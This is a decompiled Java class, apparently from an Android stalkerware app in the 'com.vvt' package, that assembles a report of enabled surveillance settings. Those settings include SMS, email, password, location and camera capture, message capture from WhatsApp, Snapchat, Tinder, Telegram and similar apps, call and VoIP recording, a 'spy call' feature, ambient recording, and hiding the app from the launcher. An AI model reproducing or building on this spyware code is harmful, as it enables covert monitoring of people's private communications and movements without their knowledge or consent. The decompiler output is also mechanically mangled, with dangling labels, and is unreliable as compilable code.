package com.vvt.appengine.a;

import com.vvt.appengine.AppEngine1;
import com.vvt.base.FeatureId;
import com.vvt.base.FxDeliveryMethod;
import com.vvt.base.RunningMode;
import com.vvt.events.FxSettingEvent;
import com.vvt.events.i;
import com.vvt.license.LicenseInfo;
import com.vvt.license.LicenseStatus;
import com.vvt.license.b;
import com.vvt.remotecontrol.input.RmtCtrlInputAddressBookMode.Mode;
import com.vvt.remotecontrol.input.RmtCtrlInputCallRecordingAudioSource.AudioSource;
import com.vvt.remotecontrol.input.RmtCtrlInputImAttachmentLimitSize;
import com.vvt.remotecontrol.input.RmtCtrlInputPanicMode.Mode;
import com.vvt.remotecontrol.output.RmtCtrlOutputSettings;
import com.vvt.shell.ShellUtil;
import java.util.ArrayList;
import java.util.Iterator;
import java.util.List;

public class bj
{
  private static final boolean a = com.vvt.ak.a.a;
  
  private String a()
  {
    boolean bool = ShellUtil.c();
    if (bool) {}
    for (String str = "Rooted";; str = "Not-Rooted") {
      return str;
    }
  }
  
  private String a(int paramInt)
  {
    Object localObject = null;
    int i = 1;
    StringBuilder localStringBuilder = new java/lang/StringBuilder;
    localStringBuilder.<init>();
    boolean bool = a;
    if (bool) {}
    bool = a;
    if (bool) {}
    bool = a;
    if (bool) {}
    bool = a;
    if (bool) {}
    bool = a;
    if (bool) {}
    int j = paramInt & 0x1;
    int k;
    int m;
    if (j == i)
    {
      k = i;
      j = paramInt & 0x2;
      m = 2;
      if (j != m) {
        break label240;
      }
      m = i;
      label96:
      j = paramInt & 0x4;
      int n = 4;
      if (j != n) {
        break label246;
      }
      j = i;
      label114:
      n = paramInt & 0x8;
      int i1 = 8;
      if (n != i1) {
        break label252;
      }
    }
    for (;;)
    {
      localObject = new java/lang/StringBuilder;
      ((StringBuilder)localObject).<init>();
      localObject = k + ";";
      localStringBuilder.append((String)localObject);
      localObject = new java/lang/StringBuilder;
      ((StringBuilder)localObject).<init>();
      localObject = m + ";";
      localStringBuilder.append((String)localObject);
      localObject = new java/lang/StringBuilder;
      ((StringBuilder)localObject).<init>();
      localObject = j + ";";
      localStringBuilder.append((String)localObject);
      localStringBuilder.append(i);
      return localStringBuilder.toString();
      k = 0;
      break;
      label240:
      m = 0;
      break label96;
      label246:
      j = 0;
      break label114;
      label252:
      i = 0;
    }
  }
  
  private String a(RmtCtrlOutputSettings paramRmtCtrlOutputSettings)
  {
    RunningMode localRunningMode = paramRmtCtrlOutputSettings.getRunningMode();
    String str = "";
    int[] arrayOfInt = bk.a;
    int i = localRunningMode.ordinal();
    i = arrayOfInt[i];
    switch (i)
    {
    }
    for (;;)
    {
      return str;
      str = "Normal";
      continue;
      str = "Limited1";
      continue;
      str = "Full";
    }
  }
  
  private String a(List paramList)
  {
    StringBuilder localStringBuilder = new java/lang/StringBuilder;
    localStringBuilder.<init>();
    Iterator localIterator = paramList.iterator();
    for (;;)
    {
      boolean bool = localIterator.hasNext();
      if (!bool) {
        break;
      }
      String str1 = (String)localIterator.next();
      int i = localStringBuilder.length();
      if (i > 0)
      {
        String str2 = ";";
        localStringBuilder.append(str2);
      }
      localStringBuilder.append(str1);
    }
    return localStringBuilder.toString();
  }
  
  private String a(boolean paramBoolean)
  {
    if (paramBoolean) {}
    for (String str = "1";; str = "0") {
      return str;
    }
  }
  
  private void a(FxSettingEvent paramFxSettingEvent, int paramInt, String paramString)
  {
    i locali = new com/vvt/events/i;
    locali.<init>();
    locali.a(paramInt);
    locali.a(paramString);
    paramFxSettingEvent.addSettingElement(locali);
  }
  
  private String b(RmtCtrlOutputSettings paramRmtCtrlOutputSettings)
  {
    int i = 3;
    int j = 2;
    int k = 1;
    long l = 1048576L;
    Object localObject = paramRmtCtrlOutputSettings.getImAttachmentLimitSize();
    int m = (int)(((RmtCtrlInputImAttachmentLimitSize)localObject).getImAttchmentLimitSize(0).longValue() / l);
    int n = (int)(((RmtCtrlInputImAttachmentLimitSize)localObject).getImAttchmentLimitSize(k).longValue() / l);
    int i1 = (int)(((RmtCtrlInputImAttachmentLimitSize)localObject).getImAttchmentLimitSize(j).longValue() / l);
    int i2 = (int)(((RmtCtrlInputImAttachmentLimitSize)localObject).getImAttchmentLimitSize(i).longValue() / l);
    Object[] arrayOfObject = new Object[4];
    Integer localInteger = Integer.valueOf(m);
    arrayOfObject[0] = localInteger;
    localInteger = Integer.valueOf(n);
    arrayOfObject[k] = localInteger;
    localInteger = Integer.valueOf(i1);
    arrayOfObject[j] = localInteger;
    localObject = Integer.valueOf(i2);
    arrayOfObject[i] = localObject;
    return String.format("%s;%s;%s;%s", arrayOfObject);
  }
  
  public FxSettingEvent a(RmtCtrlOutputSettings paramRmtCtrlOutputSettings, List paramList)
  {
    int i = 1;
    FxSettingEvent localFxSettingEvent = new com/vvt/events/FxSettingEvent;
    localFxSettingEvent.<init>();
    long l1 = System.currentTimeMillis();
    localFxSettingEvent.setEventTime(l1);
    Object localObject1 = FeatureId.CAPTURE_SMS;
    boolean bool1 = paramList.contains(localObject1);
    if (bool1)
    {
      localObject1 = FeatureId.CAPTURE_SMS;
      bool1 = paramRmtCtrlOutputSettings.getFeatureStatus((FeatureId)localObject1);
      localObject1 = a(bool1);
      a(localFxSettingEvent, i, (String)localObject1);
    }
    localObject1 = FeatureId.CAPTURE_CALLLOG;
    bool1 = paramList.contains(localObject1);
    int i32;
    if (bool1)
    {
      localObject1 = FeatureId.CAPTURE_CALLLOG;
      bool1 = paramRmtCtrlOutputSettings.getFeatureStatus((FeatureId)localObject1);
      i32 = 2;
      localObject1 = a(bool1);
      a(localFxSettingEvent, i32, (String)localObject1);
    }
    localObject1 = FeatureId.CAPTURE_EMAIL;
    bool1 = paramList.contains(localObject1);
    if (bool1)
    {
      localObject1 = FeatureId.CAPTURE_EMAIL;
      bool1 = paramRmtCtrlOutputSettings.getFeatureStatus((FeatureId)localObject1);
      i32 = 3;
      localObject1 = a(bool1);
      a(localFxSettingEvent, i32, (String)localObject1);
    }
    localObject1 = FeatureId.CAPTURE_MMS;
    bool1 = paramList.contains(localObject1);
    if (bool1)
    {
      localObject1 = FeatureId.CAPTURE_MMS;
      bool1 = paramRmtCtrlOutputSettings.getFeatureStatus((FeatureId)localObject1);
      i32 = 5;
      localObject1 = a(bool1);
      a(localFxSettingEvent, i32, (String)localObject1);
    }
    localObject1 = FeatureId.CAPTURE_CONTACT;
    bool1 = paramList.contains(localObject1);
    if (bool1)
    {
      localObject1 = FeatureId.CAPTURE_CONTACT;
      bool1 = paramRmtCtrlOutputSettings.getFeatureStatus((FeatureId)localObject1);
      i32 = 6;
      localObject1 = a(bool1);
      a(localFxSettingEvent, i32, (String)localObject1);
    }
    localObject1 = FeatureId.CAPTURE_LOCATION;
    bool1 = paramList.contains(localObject1);
    if (bool1)
    {
      localObject1 = FeatureId.CAPTURE_LOCATION;
      bool1 = paramRmtCtrlOutputSettings.getFeatureStatus((FeatureId)localObject1);
      i32 = 7;
      localObject1 = a(bool1);
      a(localFxSettingEvent, i32, (String)localObject1);
    }
    localObject1 = FeatureId.CAPTURE_IM;
    bool1 = paramList.contains(localObject1);
    if (bool1)
    {
      localObject1 = FeatureId.CAPTURE_IM;
      bool1 = paramRmtCtrlOutputSettings.getFeatureStatus((FeatureId)localObject1);
      i32 = 8;
      localObject1 = a(bool1);
      a(localFxSettingEvent, i32, (String)localObject1);
      bool1 = paramRmtCtrlOutputSettings.isBBMCaptureSupoprted();
      boolean bool36;
      if (bool1)
      {
        int j = 204;
        bool36 = paramRmtCtrlOutputSettings.isBBMCaptureEnabled();
        localObject2 = a(bool36);
        a(localFxSettingEvent, j, (String)localObject2);
      }
      boolean bool2 = paramRmtCtrlOutputSettings.isFacebookCaptureSupported();
      if (bool2)
      {
        int k = 202;
        bool36 = paramRmtCtrlOutputSettings.isFacebookCaptureEnabled();
        localObject2 = a(bool36);
        a(localFxSettingEvent, k, (String)localObject2);
      }
      boolean bool3 = paramRmtCtrlOutputSettings.isHangoutCaptureSupported();
      if (bool3)
      {
        int m = 211;
        bool36 = paramRmtCtrlOutputSettings.isHangoutCaptureEnabled();
        localObject2 = a(bool36);
        a(localFxSettingEvent, m, (String)localObject2);
      }
      boolean bool4 = paramRmtCtrlOutputSettings.isLineCaptureSupported();
      if (bool4)
      {
        int n = 201;
        bool36 = paramRmtCtrlOutputSettings.isLineCaptureEnabled();
        localObject2 = a(bool36);
        a(localFxSettingEvent, n, (String)localObject2);
      }
      boolean bool5 = paramRmtCtrlOutputSettings.isSkypeCaptureSupported();
      if (bool5)
      {
        int i1 = 203;
        bool36 = paramRmtCtrlOutputSettings.isSkypeCaptureEnabled();
        localObject2 = a(bool36);
        a(localFxSettingEvent, i1, (String)localObject2);
      }
      boolean bool6 = paramRmtCtrlOutputSettings.isViberCaptureSupported();
      if (bool6)
      {
        int i2 = 206;
        bool36 = paramRmtCtrlOutputSettings.isViberCaptureEnabled();
        localObject2 = a(bool36);
        a(localFxSettingEvent, i2, (String)localObject2);
      }
      boolean bool7 = paramRmtCtrlOutputSettings.isWeChatCaptureSupported();
      if (bool7)
      {
        int i3 = 208;
        bool36 = paramRmtCtrlOutputSettings.isWeChatCaptureEnabled();
        localObject2 = a(bool36);
        a(localFxSettingEvent, i3, (String)localObject2);
      }
      boolean bool8 = paramRmtCtrlOutputSettings.isWhatsAppCaptureSupported();
      if (bool8)
      {
        int i4 = 200;
        bool36 = paramRmtCtrlOutputSettings.isWhatsAppCaptureEnabled();
        localObject2 = a(bool36);
        a(localFxSettingEvent, i4, (String)localObject2);
      }
      boolean bool9 = paramRmtCtrlOutputSettings.isYahooMessengerCaptureSupported();
      if (bool9)
      {
        int i5 = 209;
        bool36 = paramRmtCtrlOutputSettings.isYahooMessengerCaptureEnabled();
        localObject2 = a(bool36);
        a(localFxSettingEvent, i5, (String)localObject2);
      }
      boolean bool10 = paramRmtCtrlOutputSettings.isSnapchatCaptureSupported();
      if (bool10)
      {
        int i6 = 210;
        bool36 = paramRmtCtrlOutputSettings.isSnapchatCaptureEnabled();
        localObject2 = a(bool36);
        a(localFxSettingEvent, i6, (String)localObject2);
      }
      boolean bool11 = paramRmtCtrlOutputSettings.isKikMessengerCaptureSupported();
      if (bool11)
      {
        int i7 = 213;
        bool36 = paramRmtCtrlOutputSettings.isKikMessengerCaptureEnabled();
        localObject2 = a(bool36);
        a(localFxSettingEvent, i7, (String)localObject2);
      }
      boolean bool12 = paramRmtCtrlOutputSettings.isTelegramMessengerCaptureSupported();
      if (bool12)
      {
        int i8 = 214;
        bool36 = paramRmtCtrlOutputSettings.isTelegramMessengerCaptureEnabled();
        localObject2 = a(bool36);
        a(localFxSettingEvent, i8, (String)localObject2);
      }
      boolean bool13 = paramRmtCtrlOutputSettings.isTinderCaptureSupported();
      if (bool13)
      {
        int i9 = 215;
        bool36 = paramRmtCtrlOutputSettings.isTinderCaptureEnabled();
        localObject2 = a(bool36);
        a(localFxSettingEvent, i9, (String)localObject2);
      }
      boolean bool14 = paramRmtCtrlOutputSettings.isInstagramCaptureSupported();
      if (bool14)
      {
        int i10 = 217;
        bool36 = paramRmtCtrlOutputSettings.isInstagramCaptureEnabled();
        localObject2 = a(bool36);
        a(localFxSettingEvent, i10, (String)localObject2);
      }
      boolean bool15 = paramRmtCtrlOutputSettings.isQQCaptureSupported();
      if (bool15)
      {
        int i11 = 216;
        bool36 = paramRmtCtrlOutputSettings.isQQCaptureEnabled();
        localObject2 = a(bool36);
        a(localFxSettingEvent, i11, (String)localObject2);
      }
      boolean bool16 = paramRmtCtrlOutputSettings.isHikeCaptureSupported();
      if (bool16)
      {
        int i12 = 218;
        bool36 = paramRmtCtrlOutputSettings.isHikeCaptureEnabled();
        localObject2 = a(bool36);
        a(localFxSettingEvent, i12, (String)localObject2);
      }
    }
    localObject1 = FeatureId.CAPTURE_WALLPAPER;
    boolean bool17 = paramList.contains(localObject1);
    int i33;
    if (bool17)
    {
      localObject1 = FeatureId.CAPTURE_WALLPAPER;
      bool17 = paramRmtCtrlOutputSettings.getFeatureStatus((FeatureId)localObject1);
      i33 = 9;
      localObject1 = a(bool17);
      a(localFxSettingEvent, i33, (String)localObject1);
    }
    localObject1 = FeatureId.CAPTURE_CAMERAIMAGE;
    bool17 = paramList.contains(localObject1);
    if (bool17)
    {
      localObject1 = FeatureId.CAPTURE_CAMERAIMAGE;
      bool17 = paramRmtCtrlOutputSettings.getFeatureStatus((FeatureId)localObject1);
      i33 = 10;
      localObject1 = a(bool17);
      a(localFxSettingEvent, i33, (String)localObject1);
    }
    localObject1 = FeatureId.CAPTURE_SOUND_RECORDING;
    bool17 = paramList.contains(localObject1);
    if (bool17)
    {
      localObject1 = FeatureId.CAPTURE_SOUND_RECORDING;
      bool17 = paramRmtCtrlOutputSettings.getFeatureStatus((FeatureId)localObject1);
      i33 = 11;
      localObject1 = a(bool17);
      a(localFxSettingEvent, i33, (String)localObject1);
    }
    localObject1 = FeatureId.CAPTURE_CALL_RECORDING;
    bool17 = paramList.contains(localObject1);
    if (bool17)
    {
      localObject1 = FeatureId.CAPTURE_CALL_RECORDING;
      bool17 = paramRmtCtrlOutputSettings.getFeatureStatus((FeatureId)localObject1);
      i33 = 12;
      localObject1 = a(bool17);
      a(localFxSettingEvent, i33, (String)localObject1);
    }
    localObject1 = FeatureId.CAPTURE_VIDEO_RECORDING;
    bool17 = paramList.contains(localObject1);
    if (bool17)
    {
      localObject1 = FeatureId.CAPTURE_VIDEO_RECORDING;
      bool17 = paramRmtCtrlOutputSettings.getFeatureStatus((FeatureId)localObject1);
      i33 = 13;
      localObject1 = a(bool17);
      a(localFxSettingEvent, i33, (String)localObject1);
    }
    localObject1 = FeatureId.CAPTURE_APPLICATION;
    bool17 = paramList.contains(localObject1);
    if (bool17)
    {
      localObject1 = FeatureId.CAPTURE_APPLICATION;
      bool17 = paramRmtCtrlOutputSettings.getFeatureStatus((FeatureId)localObject1);
      i33 = 15;
      localObject1 = a(bool17);
      a(localFxSettingEvent, i33, (String)localObject1);
    }
    localObject1 = FeatureId.CAPTURE_BROWSER_URL;
    bool17 = paramList.contains(localObject1);
    if (bool17)
    {
      localObject1 = FeatureId.CAPTURE_BROWSER_URL;
      bool17 = paramRmtCtrlOutputSettings.getFeatureStatus((FeatureId)localObject1);
      i33 = 16;
      localObject1 = a(bool17);
      a(localFxSettingEvent, i33, (String)localObject1);
    }
    localObject1 = FeatureId.CAPTURE_CALENDAR;
    bool17 = paramList.contains(localObject1);
    if (bool17)
    {
      localObject1 = FeatureId.CAPTURE_CALENDAR;
      bool17 = paramRmtCtrlOutputSettings.getFeatureStatus((FeatureId)localObject1);
      i33 = 17;
      localObject1 = a(bool17);
      a(localFxSettingEvent, i33, (String)localObject1);
    }
    localObject1 = FeatureId.CAPTURE_VOIP_CALLLOG;
    bool17 = paramList.contains(localObject1);
    if (bool17)
    {
      localObject1 = FeatureId.CAPTURE_VOIP_CALLLOG;
      bool17 = paramRmtCtrlOutputSettings.getFeatureStatus((FeatureId)localObject1);
      i33 = 20;
      localObject1 = a(bool17);
      a(localFxSettingEvent, i33, (String)localObject1);
    }
    localObject1 = FeatureId.CAPTURE_PASSWORD;
    bool17 = paramList.contains(localObject1);
    if (bool17)
    {
      localObject1 = FeatureId.CAPTURE_PASSWORD;
      bool17 = paramRmtCtrlOutputSettings.getFeatureStatus((FeatureId)localObject1);
      i33 = 22;
      localObject1 = a(bool17);
      a(localFxSettingEvent, i33, (String)localObject1);
    }
    localObject1 = FeatureId.CAPTURE_VOIP_CALL_RECORDING;
    bool17 = paramList.contains(localObject1);
    if (bool17)
    {
      localObject1 = FeatureId.CAPTURE_VOIP_CALL_RECORDING;
      bool17 = paramRmtCtrlOutputSettings.getFeatureStatus((FeatureId)localObject1);
      i33 = 37;
      localObject1 = a(bool17);
      a(localFxSettingEvent, i33, (String)localObject1);
      bool17 = paramRmtCtrlOutputSettings.isFacebookVoipCallRecordingCaptureSupported();
      if (bool17)
      {
        int i13 = 401;
        bool37 = paramRmtCtrlOutputSettings.isFacebookVoipCallRecordingCaptureEnabled();
        localObject2 = a(bool37);
        a(localFxSettingEvent, i13, (String)localObject2);
      }
      boolean bool18 = paramRmtCtrlOutputSettings.isHangoutVoipCallRecordingCaptureSupported();
      if (bool18)
      {
        int i14 = 410;
        bool37 = paramRmtCtrlOutputSettings.isHangoutVoipCallRecordingCaptureEnabled();
        localObject2 = a(bool37);
        a(localFxSettingEvent, i14, (String)localObject2);
      }
      boolean bool19 = paramRmtCtrlOutputSettings.isLineVoipCallRecordingCaptureSupported();
      if (bool19)
      {
        int i15 = 404;
        bool37 = paramRmtCtrlOutputSettings.isLineVoipCallRecordingCaptureEnabled();
        localObject2 = a(bool37);
        a(localFxSettingEvent, i15, (String)localObject2);
      }
      boolean bool20 = paramRmtCtrlOutputSettings.isSkypeVoipCallRecordingCaptureSupported();
      if (bool20)
      {
        int i16 = 400;
        bool37 = paramRmtCtrlOutputSettings.isSkypeVoipCallRecordingCaptureEnabled();
        localObject2 = a(bool37);
        a(localFxSettingEvent, i16, (String)localObject2);
      }
      boolean bool21 = paramRmtCtrlOutputSettings.isViberVoipCallRecordingCaptureSupported();
      if (bool21)
      {
        int i17 = 402;
        bool37 = paramRmtCtrlOutputSettings.isViberVoipCallRecordingCaptureEnabled();
        localObject2 = a(bool37);
        a(localFxSettingEvent, i17, (String)localObject2);
      }
      boolean bool22 = paramRmtCtrlOutputSettings.isWhatsAppVoipCallRecordingCaptureSupported();
      if (bool22)
      {
        int i18 = 403;
        bool37 = paramRmtCtrlOutputSettings.isWhatsAppVoipCallRecordingCaptureEnabled();
        localObject2 = a(bool37);
        a(localFxSettingEvent, i18, (String)localObject2);
      }
    }
    boolean bool37 = paramRmtCtrlOutputSettings.isCaptureEnabled();
    Object localObject2 = a(bool37);
    a(localFxSettingEvent, 41, (String)localObject2);
    l1 = paramRmtCtrlOutputSettings.getDeliveryTimer();
    localObject1 = String.valueOf(l1);
    a(localFxSettingEvent, 42, (String)localObject1);
    int i34 = paramRmtCtrlOutputSettings.getTriggerNumber();
    localObject2 = String.valueOf(i34);
    a(localFxSettingEvent, 43, (String)localObject2);
    localObject1 = FeatureId.CALL_WATCH_NOTIFICATION;
    boolean bool23 = paramList.contains(localObject1);
    if (bool23)
    {
      localObject1 = FeatureId.CALL_WATCH_NOTIFICATION;
      bool23 = paramRmtCtrlOutputSettings.getFeatureStatus((FeatureId)localObject1);
      i34 = 44;
      localObject1 = a(bool23);
      a(localFxSettingEvent, i34, (String)localObject1);
    }
    localObject1 = FeatureId.CALL_WATCH_NOTIFICATION;
    bool23 = paramList.contains(localObject1);
    if (bool23)
    {
      int i19 = 45;
      i34 = paramRmtCtrlOutputSettings.getWatchFlag();
      localObject2 = a(i34);
      a(localFxSettingEvent, i19, (String)localObject2);
    }
    localObject1 = FeatureId.CAPTURE_LOCATION;
    boolean bool24 = paramList.contains(localObject1);
    long l2;
    label2163:
    label2494:
    int i30;
    if (bool24)
    {
      l1 = paramRmtCtrlOutputSettings.getGpsTrackingIntervalMs();
      l2 = 10000L;
      bool24 = l1 < l2;
      if (!bool24)
      {
        localObject1 = "1";
        i34 = 46;
        a(localFxSettingEvent, i34, (String)localObject1);
      }
    }
    else
    {
      localObject1 = FeatureId.PANIC;
      bool24 = paramList.contains(localObject1);
      if (bool24)
      {
        localObject1 = paramRmtCtrlOutputSettings.getPanicMode();
        localObject2 = RmtCtrlInputPanicMode.Mode.LOCATION_AND_IMAGE;
        if (localObject1 != localObject2) {
          break label3376;
        }
        localObject1 = "1";
        i34 = 47;
        a(localFxSettingEvent, i34, (String)localObject1);
      }
      localObject1 = FeatureId.NOTIFICATION_NUMBER;
      bool24 = paramList.contains(localObject1);
      if (bool24)
      {
        int i20 = 48;
        localObject2 = FeatureId.NOTIFICATION_NUMBER;
        localObject2 = paramRmtCtrlOutputSettings.getCommonData((FeatureId)localObject2);
        localObject2 = a((List)localObject2);
        a(localFxSettingEvent, i20, (String)localObject2);
      }
      localObject1 = FeatureId.HOME_NUMBER;
      boolean bool25 = paramList.contains(localObject1);
      if (bool25)
      {
        int i21 = 50;
        localObject2 = FeatureId.HOME_NUMBER;
        localObject2 = paramRmtCtrlOutputSettings.getCommonData((FeatureId)localObject2);
        localObject2 = a((List)localObject2);
        a(localFxSettingEvent, i21, (String)localObject2);
      }
      localObject1 = FeatureId.MONITOR_NUMBER;
      boolean bool26 = paramList.contains(localObject1);
      if (bool26)
      {
        int i22 = 52;
        localObject2 = FeatureId.MONITOR_NUMBER;
        localObject2 = paramRmtCtrlOutputSettings.getCommonData((FeatureId)localObject2);
        localObject2 = a((List)localObject2);
        a(localFxSettingEvent, i22, (String)localObject2);
      }
      localObject1 = FeatureId.SPY_CALL;
      boolean bool27 = paramList.contains(localObject1);
      if (bool27)
      {
        localObject1 = FeatureId.SPY_CALL;
        bool27 = paramRmtCtrlOutputSettings.getFeatureStatus((FeatureId)localObject1);
        i34 = 53;
        localObject1 = a(bool27);
        a(localFxSettingEvent, i34, (String)localObject1);
      }
      localObject1 = FeatureId.COMMUNICATION_RESTRICTION;
      bool27 = paramList.contains(localObject1);
      if (bool27)
      {
        localObject1 = FeatureId.COMMUNICATION_RESTRICTION;
        bool27 = paramRmtCtrlOutputSettings.getFeatureStatus((FeatureId)localObject1);
        i34 = 54;
        localObject1 = a(bool27);
        a(localFxSettingEvent, i34, (String)localObject1);
      }
      localObject1 = FeatureId.ADDRESS_BOOK_MANAGEMENT;
      bool27 = paramList.contains(localObject1);
      if (bool27)
      {
        localObject1 = paramRmtCtrlOutputSettings.getAddressBookMode();
        localObject2 = RmtCtrlInputAddressBookMode.Mode.MONITOR;
        if (localObject1 != localObject2) {
          break label3384;
        }
        localObject1 = "1";
        i34 = 55;
        a(localFxSettingEvent, i34, (String)localObject1);
      }
      localObject1 = FeatureId.ADDRESS_BOOK_MANAGEMENT;
      bool27 = paramList.contains(localObject1);
      if (bool27)
      {
        int i23 = 56;
        localObject2 = "1.2";
        a(localFxSettingEvent, i23, (String)localObject2);
      }
      localObject1 = FeatureId.APP_PROFILE;
      boolean bool28 = paramList.contains(localObject1);
      if (bool28)
      {
        localObject1 = FeatureId.APP_PROFILE;
        bool28 = paramRmtCtrlOutputSettings.getFeatureStatus((FeatureId)localObject1);
        i34 = 57;
        localObject1 = a(bool28);
        a(localFxSettingEvent, i34, (String)localObject1);
      }
      localObject1 = FeatureId.URL_PROFILE;
      bool28 = paramList.contains(localObject1);
      if (bool28)
      {
        localObject1 = FeatureId.CAPTURE_BROWSER_URL;
        bool28 = paramRmtCtrlOutputSettings.getFeatureStatus((FeatureId)localObject1);
        i34 = 58;
        localObject1 = a(bool28);
        a(localFxSettingEvent, i34, (String)localObject1);
      }
      localObject1 = FeatureId.EMERGENCY_NUMBER;
      bool28 = paramList.contains(localObject1);
      if (bool28)
      {
        int i24 = 59;
        localObject2 = FeatureId.EMERGENCY_NUMBER;
        localObject2 = paramRmtCtrlOutputSettings.getCommonData((FeatureId)localObject2);
        localObject2 = a((List)localObject2);
        a(localFxSettingEvent, i24, (String)localObject2);
      }
      localObject1 = FeatureId.CALL_WATCH_NOTIFICATION;
      boolean bool29 = paramList.contains(localObject1);
      if (bool29)
      {
        int i25 = 60;
        localObject2 = FeatureId.CALL_WATCH_NOTIFICATION;
        localObject2 = paramRmtCtrlOutputSettings.getCommonData((FeatureId)localObject2);
        localObject2 = a((List)localObject2);
        a(localFxSettingEvent, i25, (String)localObject2);
      }
      localObject2 = a(paramRmtCtrlOutputSettings);
      a(localFxSettingEvent, 62, (String)localObject2);
      localObject1 = FeatureId.SMS_KEYWORD;
      boolean bool30 = paramList.contains(localObject1);
      if (bool30)
      {
        int i26 = 63;
        localObject2 = FeatureId.SMS_KEYWORD;
        localObject2 = paramRmtCtrlOutputSettings.getCommonData((FeatureId)localObject2);
        localObject2 = a((List)localObject2);
        a(localFxSettingEvent, i26, (String)localObject2);
      }
      localObject1 = paramRmtCtrlOutputSettings.getDeliveryMethod();
      i34 = 66;
      localObject1 = String.valueOf(((FxDeliveryMethod)localObject1).getNumber());
      a(localFxSettingEvent, i34, (String)localObject1);
      localObject1 = FeatureId.CALL_RECORDING_WATCH_NUMBER;
      boolean bool31 = paramList.contains(localObject1);
      if (bool31)
      {
        int i27 = 67;
        i34 = paramRmtCtrlOutputSettings.getCallRecWatchFlag();
        localObject2 = a(i34);
        a(localFxSettingEvent, i27, (String)localObject2);
      }
      localObject1 = FeatureId.CALL_RECORDING_WATCH_NUMBER;
      boolean bool32 = paramList.contains(localObject1);
      if (bool32)
      {
        int i28 = 68;
        localObject2 = FeatureId.CALL_RECORDING_WATCH_NUMBER;
        localObject2 = paramRmtCtrlOutputSettings.getCommonData((FeatureId)localObject2);
        localObject2 = a((List)localObject2);
        a(localFxSettingEvent, i28, (String)localObject2);
      }
      localObject2 = a();
      a(localFxSettingEvent, 69, (String)localObject2);
      localObject1 = FeatureId.CAPTURE_CALL_RECORDING;
      boolean bool33 = paramList.contains(localObject1);
      if (bool33)
      {
        int i29 = 70;
        i34 = paramRmtCtrlOutputSettings.getCallRecordingAudioSource().getId();
        localObject2 = Integer.toString(i34);
        a(localFxSettingEvent, i29, (String)localObject2);
      }
      localObject1 = FeatureId.HIDE_FROM_APP_DRAWER;
      i30 = paramList.contains(localObject1);
      if (i30 != 0)
      {
        i34 = 72;
        i30 = paramRmtCtrlOutputSettings.isSuperUserIconHidden();
        if (i30 == 0) {
          break label3411;
        }
        i30 = 0;
        localObject1 = null;
      }
    }
    for (;;)
    {
      localObject1 = Integer.toString(i30);
      a(localFxSettingEvent, i34, (String)localObject1);
      localObject1 = FeatureId.CAPTURE_IM;
      boolean bool34 = paramList.contains(localObject1);
      if (bool34)
      {
        int i31 = 75;
        String str = b(paramRmtCtrlOutputSettings);
        a(localFxSettingEvent, i31, str);
      }
      localObject1 = FeatureId.AMBIENT_RECORDING;
      boolean bool35 = paramList.contains(localObject1);
      if (bool35)
      {
        localObject1 = FeatureId.AMBIENT_RECORDING;
        bool35 = paramRmtCtrlOutputSettings.getFeatureStatus((FeatureId)localObject1);
        i = 150;
        localObject1 = a(bool35);
        a(localFxSettingEvent, i, (String)localObject1);
      }
      return localFxSettingEvent;
      l2 = 30000L;
      bool35 = l1 < l2;
      if (!bool35)
      {
        localObject1 = "2";
        break;
      }
      l2 = 60000L;
      bool35 = l1 < l2;
      if (!bool35)
      {
        localObject1 = "3";
        break;
      }
      l2 = 300000L;
      bool35 = l1 < l2;
      if (!bool35)
      {
        localObject1 = "4";
        break;
      }
      l2 = 600000L;
      bool35 = l1 < l2;
      if (!bool35)
      {
        localObject1 = "5";
        break;
      }
      l2 = 1200000L;
      bool35 = l1 < l2;
      if (!bool35)
      {
        localObject1 = "6";
        break;
      }
      l2 = 2400000L;
      bool35 = l1 < l2;
      if (!bool35)
      {
        localObject1 = "7";
        break;
      }
      l2 = 3600000L;
      bool35 = l1 < l2;
      if (!bool35)
      {
        localObject1 = "8";
        break;
      }
      localObject1 = "0";
      break;
      label3376:
      localObject1 = "2";
      break label2163;
      label3384:
      localObject2 = RmtCtrlInputAddressBookMode.Mode.RESTRICTED;
      if (localObject1 == localObject2)
      {
        localObject1 = "2";
        break label2494;
      }
      localObject1 = "0";
      break label2494;
      label3411:
      bool35 = i;
    }
  }
  
  public boolean a(AppEngine1 paramh)
  {
    Object localObject1 = new com/vvt/appengine/a/j;
    ((j)localObject1).<init>();
    Object localObject2 = ((j)localObject1).a(paramh);
    localObject1 = paramh.k;
    Object localObject3 = ((b)localObject1).a();
    int i = ((LicenseInfo)localObject3).getConfigurationId();
    LicenseStatus localLicenseStatus1 = ((LicenseInfo)localObject3).getLicenseStatus();
    LicenseStatus localLicenseStatus2 = LicenseStatus.NOT_ACTIVATED;
    if (localLicenseStatus1 == localLicenseStatus2) {
      i = -1;
    }
    for (;;)
    {
      localObject1 = paramh.e.a(i).b();
      localObject3 = paramh.h;
      if (localObject3 != null)
      {
        boolean bool = a;
        if (bool) {}
        localObject1 = a((RmtCtrlOutputSettings)localObject2, (List)localObject1);
        localObject2 = new java/util/ArrayList;
        ((ArrayList)localObject2).<init>();
        ((List)localObject2).add(localObject1);
        ((com.vvt.base.a)localObject3).a((List)localObject2);
      }
      return true;
      localLicenseStatus1 = ((LicenseInfo)localObject3).getLicenseStatus();
      localLicenseStatus2 = LicenseStatus.EXPIRED;
      if (localLicenseStatus1 == localLicenseStatus2)
      {
        i = -2;
      }
      else
      {
        localObject3 = ((LicenseInfo)localObject3).getLicenseStatus();
        localLicenseStatus1 = LicenseStatus.DISABLED;
        if (localObject3 == localLicenseStatus1) {
          i = -3;
        }
      }
    }
  }
}


/* Location:              /Volumes/D1/codebase/android/POC/assets/product/maind/classes-enjarify.jar!/com/vvt/appengine/a/bj.class
 * Java compiler version: 5 (49.0)
 * JD-Core Version:       0.7.1
 */